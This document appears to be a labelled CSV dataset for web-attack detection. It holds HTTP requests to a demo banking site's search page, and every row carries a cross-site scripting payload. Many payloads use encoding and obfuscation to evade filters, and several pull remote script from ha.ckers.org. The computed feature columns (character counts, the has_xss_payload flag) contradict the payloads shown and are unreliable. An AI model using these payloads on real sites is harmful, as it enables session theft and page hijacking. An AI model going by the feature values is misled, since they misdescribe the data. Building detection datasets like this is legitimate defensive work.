method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,response_status,response_time,nature
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC='vbscript:msgbox(""XSS"")'>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,305,xss
GET,"http://demo.testfire.net/search.jsp?query=<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,297,xss
GET,"http://demo.testfire.net/search.jsp?query=<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,318,xss
GET,"http://demo.testfire.net/search.jsp?query=<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,315,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,310,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMGSRC=""javascript:alert('XSS')"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,310,xss
GET,http://demo.testfire.net/search.jsp?query=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,301,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC="" &#14;  javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,300,xss
GET,"http://demo.testfire.net/search.jsp?query=<XSS STYLE=""xss:expression(alert('XSS'))"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,295,xss
GET,"http://demo.testfire.net/search.jsp?query=<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,293,xss
GET,"http://demo.testfire.net/search.jsp?query=<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,286,xss
GET,"http://demo.testfire.net/search.jsp?query=<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,288,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,286,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,285,xss
GET,"http://demo.testfire.net/search.jsp?query=firefoxurl:test|"" -new-window javascript:alert(\'Cross%20Browser%20Scripting!\');""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,274,xss
GET,http://demo.testfire.net/search.jsp?query=res://c:\\program files\\adobe\\acrobat 7.0\\acrobat\\acrobat.dll/#2/#210,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,281,xss
GET,"http://demo.testfire.net/search.jsp?query=>""'><img src=""javascript:alert(' XSS')"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,283,xss
GET,http://demo.testfire.net/search.jsp?query=alert(1),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,273,xss
GET,http://demo.testfire.net/search.jsp?query=A=alert;A(1),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,344,xss
GET,http://demo.testfire.net/search.jsp?query=+alert(0)+,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,342,xss
GET,"http://demo.testfire.net/search.jsp?query=';//a=eval;b=alert;a(b(9));//","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,340,xss
GET,http://demo.testfire.net/search.jsp?query=a=1;a=eval;b=alert;a(b(11));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,335,xss
GET,http://demo.testfire.net/search.jsp?query='};a=eval;b=alert;a(b(13));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,278,xss
GET,http://demo.testfire.net/search.jsp?query=1};a=eval;b=alert;a(b(14));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,286,xss
GET,http://demo.testfire.net/search.jsp?query='];a=eval;b=alert;a(b(15));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,279,xss
GET,http://demo.testfire.net/search.jsp?query=1];a=eval;b=alert;a(b(17));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,275,xss
GET,http://demo.testfire.net/search.jsp?query=1;a=eval;b=alert;a(b(/c/.source));,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,320,xss
GET,http://demo.testfire.net/search.jsp?query=xyz onerror=alert(6);,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,323,xss
GET,"http://demo.testfire.net/search.jsp?query=<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,316,xss
GET,"http://demo.testfire.net/search.jsp?query=<xml id=""xss""><i><b><img src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span datasrc=""#xss"" datafld=""b"" dataformatas=""html""></span>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,315,xss
GET,"http://demo.testfire.net/search.jsp?query=<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert('xss')</script>""> </body></html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,300,xss
GET,"http://demo.testfire.net/search.jsp?query=<html xmlns:xss><?import namespace=""xss"" implementation=""httP://ha.ckers.org/xss.htc""><xss:xss>xss</xss:xss></html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,295,xss
GET,"http://demo.testfire.net/search.jsp?query=<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,295,xss
